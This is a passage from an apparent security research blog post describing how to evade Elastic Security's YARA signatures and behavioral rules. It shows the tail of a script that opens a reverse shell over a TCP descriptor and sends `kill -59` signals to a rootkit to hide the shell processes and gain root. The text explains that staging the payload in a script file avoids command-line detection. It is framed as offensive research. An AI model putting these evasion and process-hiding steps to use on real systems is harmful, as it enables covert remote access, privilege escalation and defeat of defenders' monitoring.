SHELL_PID=$!
sleep 1
kill -59 $SHELL_PID
kill -59 $$
```

The script:
1. Opens TCP connection on file descriptor 196
2. Spawns reverse shell (`sh`) in background using that connection
3. Captures the specific PID of the spawned shell: `SHELL_PID=$!`
4. Waits 1 second for connection to establish
5. Runs `kill -59 $SHELL_PID` to hide only the reverse shell process
6. Runs `kill -59 $$` to hide the parent bash script

This approach only hides the specific processes created by the script, avoiding interference with legitimate system `sh` processes.

**Step 3:** Execute the script. Elastic sees only:
```bash
/bin/bash /singularity
```

No `/dev/tcp/` in the command line - detection bypassed.

**Step 4:** Inside the script, automatic hiding occurs:
1. Reverse shell spawns in background
2. Script captures the exact PID using `$!` variable
3. Waits 1 second for connection to establish
4. `kill -59 $SHELL_PID` hides only the spawned reverse shell
5. `kill -59 $$` hides the parent bash script

Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.

![imgur](https://i.imgur.com/ov9YPSL.png)

## Result

**No behavioral alerts triggered**  
**Reverse shell establishes successfully**  
**Processes completely invisible to monitoring tools**  
**Root privileges granted automatically**

Elastic's behavioral rules scan entire command lines for patterns like `/dev/tcp/`. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit's `kill -59` signal automatically handles privilege escalation and process hiding.

# Conclusion

This research demonstrates techniques to evade Elastic Security's static YARA signatures and behavioral detection rules through:

- Static Signature Evasion: String fragmentation and symbol randomization
- Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks

These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.

If you've read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.